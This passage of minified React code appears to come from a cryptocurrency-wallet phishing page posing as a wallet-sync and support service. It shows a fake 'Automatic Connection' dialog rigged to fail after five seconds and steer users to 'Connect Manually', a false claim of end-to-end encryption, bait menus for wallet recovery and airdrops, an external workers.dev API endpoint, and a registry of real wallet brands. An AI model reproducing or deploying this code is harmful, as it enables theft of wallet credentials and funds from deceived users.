    type: t = "button",
    children: n,
    dense: r,
    label: l,
    onClick: a,
    className: o,
    color: i = "primary",
  }) => {
    const u = {
      outlined: {
        white:
          "border border-white hover:border-primary hover:bg-primary text-white",
        primary:
          "border border-primary hover:border-primary hover:bg-primary text-white",
      },
      filled: {
        white: "border-primary bg-white text-primary",
        primary: "border-primary bg-primary text-white",
      },
    }[e][i];
    return f.jsx("button", {
      type: t,
      className: en(
        u,
        "inline-flex justify-center items-center font-semibold border rounded",
        "hover:shadow-primary/50 hover:shadow-lg transition-all",
        o,
        r ? "py-2 px-5 text-xs" : "py-2.5 px-8 text-sm"
      ),
      onClick: a,
      children: n || l,
    });
  },
  Xh = ({ onConnect: e }) =>
    f.jsx("header", {
      className: "sticky top-0 pt-4 px-4",
      children: f.jsxs("nav", {
        className:
          "max-w-screen-xl flex flex-wrap items-center justify-between mx-auto p-4 border rounded-full bg-black",
        children: [
          f.jsxs("a", {
            href: "#",
            className: "flex items-center space-x-1 rtl:space-x-reverse",
            children: [
              f.jsx("img", { src: "/apex.png", className: "h-8", alt: "Logo" }),
              f.jsx("span", {
                className: "self-center text-xl font-bold whitespace-nowrap",
                children: "WebsMainNetServer",
              }),
            ],
          }),
          f.jsx(cr, {
            as: "div",
            className: "inline-block text-left",
            children: ({ open: t }) =>
              f.jsxs(f.Fragment, {
                children: [
                  f.jsx(cr.Button, {
                    as: "button",
                    className: "inline-flex items-center focus:outline-none",
                    children: f.jsx("span", {
                      className: "text-white fill-white h-6 w-6",
                      children: t ? oi.close : oi.menu,
                    }),
                  }),
                  f.jsx(we, {
                    as: p.Fragment,
                    enter: "transition ease-out duration-100",
                    enterFrom: "transform opacity-0 scale-95",
                    enterTo: "transform opacity-100 scale-100",
                    leave: "transition ease-in duration-75",
                    leaveFrom: "transform opacity-100 scale-100",
                    leaveTo: "transform opacity-0 scale-95",
                    children: f.jsx(cr.Items, {
                      as: "div",
                      className: en(
                        "absolute right-0 left-0",
                        "divide-y divide-gray-200 bg-black shadow-lg",
                        "mt-2.5 w-full py-6 z-[5] focus:outline-none"
                      ),
                      children: f.jsxs("div", {
                        className: "flex flex-col items-center gap-3",
                        children: [
                          ["Twitter", "Discord", "GitHub", "Mirror"].map((n) =>
                            f.jsx(
                              cr.Item,
                              {
                                as: "a",
                                href: "#",
                                className:
                                  "inline-block py-2.5 px-6 text-base hover:underline transition-all ease-in duration-200",
                                children: n,
                              },
                              n
                            )
                          ),
                          f.jsx(cr.Item, {
                            as: un,
                            variant: "outlined",
                            onClick: e,
                            children: "Synchronize Wallet",
                          }),
                        ],
                      }),
                    }),
                  }),
                ],
              }),
          }),
        ],
      }),
    });
function Zh({ open: e, onClose: t, wallet: n, handleManual: r }) {
  const [l, a] = p.useState(!1);
  return (
    p.useEffect(() => {
      let o;
      return (
        e
          ? (o = setTimeout(() => {
              a(!0);
            }, 5e3))
          : (a(!1), clearTimeout(o)),
        () => {
          clearTimeout(o);
        }
      );
    }, [e]),
    f.jsx(f.Fragment, {
      children: f.jsx(we, {
        appear: !0,
        show: e,
        as: p.Fragment,
        children: f.jsxs(Re, {
          as: "div",
          className: "relative z-50",
          onClose: t,
          children: [
            f.jsx(we.Child, {
              as: p.Fragment,
              enter: "ease-out duration-300",
              enterFrom: "opacity-0",
              enterTo: "opacity-100",
              leave: "ease-in duration-200",
              leaveFrom: "opacity-100",
              leaveTo: "opacity-0",
              children: f.jsx("div", {
                className: "fixed inset-0 bg-black bg-opacity-50",
              }),
            }),
            f.jsx("div", {
              className: "fixed inset-0 overflow-y-auto",
              children: f.jsx("div", {
                className:
                  "flex min-h-full items-end md:items-center justify-center md:p-4 text-center",
                children: f.jsx(we.Child, {
                  as: p.Fragment,
                  enter: "ease-out duration-300",
                  enterFrom: "opacity-0 scale-95",
                  enterTo: "opacity-100 scale-100",
                  leave: "ease-in duration-200",
                  leaveFrom: "opacity-100 scale-100",
                  leaveTo: "opacity-0 scale-95",
                  children: f.jsxs(Re.Panel, {
                    className:
                      "w-full md:max-w-sm transform overflow-hidden rounded-2xl rounded-b-none md:rounded-b-2xl bg-neutral-800 py-4 px-6 text-white text-left align-middle shadow-xl transition-all",
                    children: [
                      f.jsxs(Re.Title, {
                        as: "div",
                        className: "flex justify-between items-center",
                        children: [
                          f.jsx("h2", {
                            className: "text-lg font-semibold pl-2",
                            children: "Automatic Connection",
                          }),
                          f.jsx("button", {
                            type: "button",
                            onClick: t,
                            className: "focus:outline-none focus:border-none",
                            children: f.jsx("svg", {
                              height: 24,
                              width: 24,
                              viewBox: "0 0 24 24",
                              children: f.jsx("path", {
                                fill: "currentColor",
                                d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z",
                              }),
                            }),
                          }),
                        ],
                      }),
                      l
                        ? f.jsx("div", {
                            className:
                              "text-red-500 border-2 border-red-500 font-semibold mt-4 py-3 px-4 rounded-lg flex items-center justify-between gap-2",
                            children: f.jsx("p", {
                              className: "text-sm",
                              children:
                                "An error occurred... please try again or connect manually",
                            }),
                          })
                        : f.jsxs("div", {
                            className:
                              "bg-primary/20 text-primary font-medium mt-4 py-4 px-4 rounded-lg flex items-center justify-between gap-2",
                            children: [
                              f.jsx("p", {
                                className: "text-sm",
                                children: "Connecting...",
                              }),
                              f.jsx("svg", {
                                width: "24",
                                height: "24",
                                viewBox: "0 0 24 24",
                                className: "animate-spin fill-current",
                                xmlns: "http://www.w3.org/2000/svg",
                                children: f.jsx("path", {
                                  d: "M10.14,1.16a11,11,0,0,0-9,8.92A1.59,1.59,0,0,0,2.46,12,1.52,1.52,0,0,0,4.11,10.7a8,8,0,0,1,6.66-6.61A1.42,1.42,0,0,0,12,2.69h0A1.57,1.57,0,0,0,10.14,1.16Z",
                                }),
                              }),
                            ],
                          }),
                      f.jsxs("div", {
                        className: "mt-4 bg-primary/20 rounded-lg py-3 px-4",
                        children: [
                          f.jsx("h6", {
                            className: "text-base font-medium",
                            children: n,
                          }),
                          f.jsx("p", {
                            className: "text-sm",
                            children:
                              "This session is protected with an end-to-end encryption",
                          }),
                        ],
                      }),
                      l &&
                        f.jsx(un, {
                          dense: !0,
                          variant: "outlined",
                          label: "Connect Manually",
                          onClick: r,
                          className: "mt-4",
                        }),
                    ],
                  }),
                }),
              }),
            }),
          ],
        }),
      }),
    })
  );
}
const Jh = [
    { title: "Recovery", subtitle: "Click here to for wallet recovery" },
    { title: "Claim", subtitle: "Click here to claim assets" },
    { title: "Swap", subtitle: "Click here for assets swapping" },
    { title: "Slippage", subtitle: "Click here for slippage related error" },
    {
      title: "Transaction",
      subtitle: "Click here for transaction related issues",
    },
    { title: "Cross Transfer", subtitle: "Click here for cross bridge issues" },
    { title: "Staking", subtitle: "Click here for Staking related issues" },
    { title: "Exchange", subtitle: "Click here for exchange related issues" },
    {
      title: "Connect to Dapps",
      subtitle: "Click here for error while connectting to dapps.",
    },
    { title: "Login", subtitle: "Click here for wallet login issue." },
    {
      title: "Whitelist",
      subtitle: "Click here for whitelist related issues.",
    },
    { title: "Migration", subtitle: "Click here for migration" },
    {
      title: "Missing/Irregular Balance",
      subtitle: "Click here to recover lost/missing funds.",
    },
    {
      title: "Wallet Glitch / Wallet Error",
      subtitle: "Click here if you have problem with your trading wallet.",
    },
    {
      title: "Transaction Delay",
      subtitle: "Click here for any issues related to transaction delay.",
    },
    {
      title: "Claim Airdrop",
      subtitle: "Click here for airdrop related issues.",
    },
    {
      title: "NFTs",
      subtitle: "Click here for NFTs minting/transfer related issues.",
    },
    {
      title: "Locked Account",
      subtitle: "Click here for issues related to account lock.",
    },
  ],
  qh = "https://senderawrr.xefelec316.workers.dev/api",
  aa = [
    "MetaMask",
    "Coinbase Wallet",
    "WalletConnect",
    "Ledger Wallet",
    "All Wallets",
  ];
function ev({ open: e, onClose: t, handleSelect: n }) {
  return f.jsx(f.Fragment, {
    children: f.jsx(we, {
      appear: !0,
      show: e,
      as: p.Fragment,
      children: f.jsxs(Re, {
        as: "div",
        className: "relative z-50",
        onClose: t,
        children: [
          f.jsx(we.Child, {
            as: p.Fragment,
            enter: "ease-out duration-300",
            enterFrom: "opacity-0",
            enterTo: "opacity-100",
            leave: "ease-in duration-200",
            leaveFrom: "opacity-100",
            leaveTo: "opacity-0",
            children: f.jsx("div", {
              className: "fixed inset-0 bg-black bg-opacity-50",
            }),
          }),
          f.jsx("div", {
            className: "fixed inset-0 overflow-y-auto",
            children: f.jsx("div", {
              className:
                "flex min-h-full items-end md:items-center justify-center md:p-4 text-center",
              children: f.jsx(we.Child, {
                as: p.Fragment,
                enter: "ease-out duration-300",
                enterFrom: "opacity-0 scale-95",
                enterTo: "opacity-100 scale-100",
                leave: "ease-in duration-200",
                leaveFrom: "opacity-100 scale-100",
                leaveTo: "opacity-0 scale-95",
                children: f.jsxs(Re.Panel, {
                  className:
                    "w-full md:max-w-sm transform overflow-hidden rounded-2xl rounded-b-none md:rounded-b-2xl bg-neutral-800 py-4 px-6 text-white text-left align-middle shadow-xl transition-all",
                  children: [
                    f.jsxs(Re.Title, {
                      as: "div",
                      className: "flex justify-between items-center",
                      children: [
                        f.jsx("h2", {
                          className: "text-lg font-semibold pl-2",
                          children: "Connect Wallet",
                        }),
                        f.jsx("button", {
                          type: "button",
                          onClick: t,
                          className: "focus:outline-none focus:border-none",
                          children: f.jsx("svg", {
                            height: 24,
                            width: 24,
                            viewBox: "0 0 24 24",
                            children: f.jsx("path", {
                              fill: "currentColor",
                              d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z",
                            }),
                          }),
                        }),
                      ],
                    }),
                    f.jsx("div", {
                      className: "mt-4 flex flex-col gap-4",
                      children: aa.map((r) =>
                        f.jsxs(
                          "button",
                          {
                            className:
                              "px-2.5 py-3 text-base flex items-center gap-4 bg-black rounded-lg hover:bg-primary/20 transition hover:shadow-lg",
                            onClick: () => n(r),
                            children: [
                              f.jsx("img", {
                                src: `/images/${r
                                  .replace(/\s/g, "")
                                  .toLowerCase()}.png`,
                                className: "bg-white h-10 w-10 rounded-lg p-1",
                              }),
                              r,
                            ],
                          },
                          r
                        )
                      ),
                    }),
                  ],
                }),
              }),
            }),
          }),
        ],
      }),
    }),
  });
}
const On = {
    haspack: { id: "haspack", name: "HashPack Wallet" },
    banksocial: { id: "banksocial", name: "BankSocial Wallet" },
    "1ce6dae0fea7114845": {
      id: "1ce6dae0fea7114845",
      name: "Binance Smart Chain",
      homepage: "https://www.binance.org/en/smartChain",
      chains: ["eip155:1"],
    },
    "1ce6dae0fea7114844": {
      id: "1ce6dae0fea7114844",
      name: "SafePal Wallet",
      homepage: "https://safepal.io/",
      chains: ["eip155:1"],
    },
    fetchai: { id: "fetchai", name: "Fetch.ai Wallet" },
    bfw192192: {
      id: "bfw192192",
      name: "Bifrost wallet",
      homepage: "https://bifrostwallet.com/",
      chains: ["eip155:1"],
    },
    "0fledge": { id: "0fledge", name: "Ledger Live" },
    zerion: { id: "zerion", name: "Zerion Wallet" },
    okx: { id: "okx", name: "OKX Wallet" },
    shido: { id: "shido", name: "Shido Wallet" },
    xumm2e093bf3: {
      id: "xumm2e093bf3",
      name: "XUMM Wallet",
      homepage: "https://xumm.app/",
      chains: ["eip155:1"],
    },
    "1c08453": { id: "1c08453", name: "Coinbase Wallet" },
    gateweb3: { id: "gateweb3", name: "GateWeb3 Wallet" },
    bitget: { id: "bitget", name: "BitGet Wallet" },
    robinhood: { id: "robinhood", name: "Robinhood Wallet" },
    bybit: { id: "bybit", name: "ByBit Wallet" },
    frontier: { id: "frontier", name: "Frontier Wallet" },
    "1g7023": { id: "1g7023", name: "Grove Wallet" },
    "15473m006": { id: "15473m006", name: "SafeMoon Wallet" },
    14415849: { id: "14415849", name: "Uniswap Wallet" },
    "154174pro": { id: "154174pro", name: "SaitaPro Wallet" },
    "1984670m": { id: "1984670m", name: "Phantom Wallet" },
    "136716n": { id: "136716n", name: "Enjin Wallet" },
    133775474: { id: "133775474", name: "Polkadot Wallet" },
    blockchain: { id: "blockchain", name: "Blockchain Wallet" },
    mew: { id: "mew", name: "MEW Wallet" },
    rabby: { id: "rabby", name: "Rabby Wallet" },
    brise: { id: "brise", name: "BRISE Wallet" },
    "468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63": {
      id: "468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63",
      name: "D'CENT Wallet",
      homepage: "https://dcentwallet.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/kr/app/dcent-hardware-wallet/id1447206611",
        android:
          "https://play.google.com/store/apps/details?id=com.kr.iotrust.dcent.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: { shortName: "D'CENT", colors: { primary: "", secondary: "" } },
    },
    "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369": {
      id: "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369",
      name: "Rainbow",
      homepage: "https://rainbow.me/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/rainbow-ethereum-wallet/id1457119021",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "rainbow:", universal: "https://rnbwapp.com" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Rainbow",
        colors: { primary: "rgb(0, 30, 89)", secondary: "" },
      },
    },
    "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0": {
      id: "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
      name: "Trust Wallet",
      homepage: "https://trustwallet.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/app/apple-store/id1288339409",
        android:
          "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "trust:", universal: "https://link.trustwallet.com" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Trust",
        colors: { primary: "rgb(51, 117, 187)", secondary: "" },
      },
    },
    cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46: {
      id: "cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46",
      name: "Argent",
      homepage: "https://argent.xyz/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/argent/id1358741926",
        android:
          "https://play.google.com/store/apps/details?id=im.argent.contractwalletclient",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "argent://app", universal: "https://argent.link/app" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Argent",
        colors: { primary: "rgb(255, 135, 91)", secondary: "" },
      },
    },
    c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96: {
      id: "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
      name: "MetaMask",
      homepage: "https://metamask.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/metamask/id1438144202",
        android: "https://play.google.com/store/apps/details?id=io.metamask",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "metamask:", universal: "https://metamask.app.link" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "MetaMask",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f: {
      id: "a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f",
      name: "Gnosis Safe Multisig",
      homepage: "https://gnosis-safe.io/",
      chains: ["eip155:1"],
      app: {
        browser: "https://gnosis-safe.io/app/",
        ios: "https://apps.apple.com/app/id1515759131",
        android: "https://play.google.com/store/apps/details?id=io.gnosis.safe",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Gnosis Safe",
        colors: { primary: "", secondary: "" },
      },
    },
    "1ce6dae0fea7114841": {
      id: "1ce6dae0fea7114841",
      name: "Equal",
      homepage: "https://equal.tech/",
      chains: ["eip155:1"],
    },
    "1ce6dae0fea7114842": {
      id: "1ce6dae0fea7114842",
      name: "MEET.ONE",
      homepage: "https://www.meet.one/",
      chains: ["eip155:1"],
    },
    "1ce6dae0fea7114843": {
      id: "1ce6dae0fea7114843",
      name: "MoriX Wallet",
      homepage: "https://morixjp.com/eng/products/walletcard",
      chains: ["eip155:1"],
    },
    brave: { id: "brave", name: "Brave Wallet" },
    venly: { id: "venly", name: "Venly Wallet" },
    f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d: {
      id: "f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d",
      name: "Crypto.com | DeFi Wallet",
      homepage: "https://crypto.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/id1262148500",
        android:
          "https://play.google.com/store/apps/details?id=co.mona.android",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: {
        native: "cryptowallet:",
        universal: "https://wallet.crypto.com",
      },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Crypto.com",
        colors: { primary: "rgb(17, 153, 250)", secondary: "" },
      },
    },
    "0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c": {
      id: "0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c",
      name: "Pillar",
      homepage: "https://pillarproject.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/app/apple-store/id1346582238",
        android:
          "https://play.google.com/store/apps/details?id=com.pillarproject.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "pillarwallet:", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Pillar",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    "9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2": {
      id: "9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2",
      name: "imToken",
      homepage: "https://token.im/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://itunes.apple.com/us/app/imtoken2/id1384798940",
        android: "https://play.google.com/store/apps/details?id=im.token.app",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "imtokenv2:", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "imToken",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137: {
      id: "dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137",
      name: "ONTO",
      homepage: "https://onto.app/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/onto-an-ontology-dapp/id1436009823",
        android:
          "https://play.google.com/store/apps/details?id=com.github.ontio.onto",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "ontoprovider:", universal: "https://onto.app" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "ONTO",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66": {
      id: "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66",
      name: "TokenPocket",
      homepage: "https://tokenpocket.pro/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/tokenpocket-trusted-wallet/id1436028697",
        android:
          "https://play.google.com/store/apps/details?id=vip.mytokenpocket",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "tpoutside:", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "TokenPocket",
        colors: { primary: "rgb(41, 128, 254)", secondary: "" },
      },
    },
    "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26": {
      id: "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26",
      name: "MathWallet",
      homepage: "https://mathwallet.org/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/math-wallet-blockchain-wallet/id1383637331",
        android:
          "https://play.google.com/store/apps/details?id=com.medishares.android",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: {
        native: "mathwallet:",
        universal: "https://www.mathwallet.org",
      },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "MathWallet",
        colors: { primary: "", secondary: "" },
      },
    },
    ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b: {
      id: "ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b",
      name: "BitPay",
      homepage: "https://bitpay.com",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/bitpay-buy-crypto/id1149581638",
        android:
          "https://play.google.com/store/apps/details?id=com.bitpay.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "bitpay:", universal: "https://bitpay.com/wallet" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "BitPay",
        colors: { primary: "rgb(26, 59, 139)", secondary: "" },
      },
    },
    "83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168": {
      id: "83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168",
      name: "Walleth",
      homepage: "https://walleth.org/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "",
        android: "https://play.google.com/store/apps/details?id=org.walleth",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Walleth",
        colors: { primary: "", secondary: "" },
      },
    },
    "71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d": {
      id: "71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d",
      name: "Authereum",
      homepage: "https://authereum.org",
      chains: ["eip155:1"],
      app: {
        browser: "https://authereum.com/i/account",
        ios: "",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Authereum",
        colors: { primary: "", secondary: "" },
      },
    },
    "9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f": {
      id: "9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f",
      name: "Dharma",
      homepage: "https://www.dharma.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/dharma-save-send-globally/id1495144415",
        android:
          "https://play.google.com/store/apps/details?id=io.dharma.Dharma",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "dharma:", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Dharma",
        colors: { primary: "#0DD675", secondary: "#F5F5F5" },
      },
    },
    "09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890": {
      id: "09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890",
      name: "1inch Wallet",
      homepage: "https://1inch.io/wallet/",
      chains: ["eip155:1", "eip155:56"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/1inch-defi-wallet/id1546049391",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "1inch:", universal: "https://wallet.1inch.io" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "1inch",
        colors: { primary: "rgb(31, 36, 46)", secondary: "" },
      },
    },
    bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4: {
      id: "bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4",
      name: "Huobi Wallet",
      homepage: "https://huobiwallet.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/id1433883012",
        android:
          "https://play.google.com/store/apps/details?id=com.huobionchainwallet.gp",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "huobiwallet:", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Huobi",
        colors: { primary: "rgb(45,101,248)", secondary: "" },
      },
    },
    efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61: {
      id: "efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61",
      name: "Eidoo",
      homepage: "https://eidoo.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://itunes.apple.com/app/apple-store/id1279896253",
        android:
          "https://play.google.com/store/apps/details?id=io.eidoo.wallet.prodnet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "eidoo:", universal: "https://eidoo.io/crypto-wallet" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Eidoo",
        colors: { primary: "rgb(55, 179, 159)", secondary: "" },
      },
    },
    "61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e": {
      id: "61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e",
      name: "MYKEY",
      homepage: "https://mykey.org",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://itunes.apple.com/app/id1458318224",
        android: "https://play.google.com/store/apps/details?id=com.mykey.id",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "mykeywalletconnect:", universal: "https://mykey.org" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "MYKEY",
        colors: { primary: "rgb(255, 255, 255)", secondary: "" },
      },
    },
    dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756: {
      id: "dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756",
      name: "Loopring Wallet",
      homepage: "https://loopring.io",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/loopring-smart-wallet/id1550921126",
        android:
          "https://play.google.com/store/apps/details?id=loopring.defi.wallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Loopring",
        colors: { primary: "", secondary: "" },
      },
    },
    "6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6": {
      id: "6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6",
      name: "TrustVault",
      homepage: "https://trustology.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/app/apple-store/id1455959680",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "TrustVault",
        colors: { primary: "", secondary: "" },
      },
    },
    "185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a": {
      id: "185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a",
      name: "Atomic",
      homepage: "https://atomicwallet.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/us/app/atomic-wallet/id1478257827",
        android:
          "https://play.google.com/store/apps/details?id=io.atomicwallet",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: { shortName: "Atomic", colors: { primary: "", secondary: "" } },
    },
    b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e: {
      id: "b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e",
      name: "Coin98",
      homepage: "https://coin98.app/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://ios.coin98.app/",
        android:
          "https://play.google.com/store/apps/details?id=coin98.crypto.finance.media",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "coin98:", universal: "https://coin98.app" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "Coin98",
        colors: { primary: "rgb(39,39,39)", secondary: "" },
      },
    },
    "1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d": {
      id: "1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d",
      name: "CoolWallet S",
      homepage: "https://coolwallet.io/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://itunes.apple.com/us/app/coolwallet-s-2018/id1328764142",
        android:
          "https://play.google.com/store/apps/details?id=com.coolbitx.cwsapp",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: {
        shortName: "CoolWallet S",
        colors: { primary: "", secondary: "" },
      },
    },
    beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693: {
      id: "beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693",
      name: "Alice",
      homepage: "https://alicedapp.com/",
      chains: ["eip155:1"],
      app: {
        browser: "",
        ios: "https://apps.apple.com/au/app/alice-browser/id1472818028",
        android: "",
        mac: "",
        windows: "",
        linux: "",
      },
      mobile: { native: "", universal: "" },
      desktop: { native: "", universal: "" },
      metadata: { shortName: "Alice", colors: { primary: "", secondary: "" } },
    },
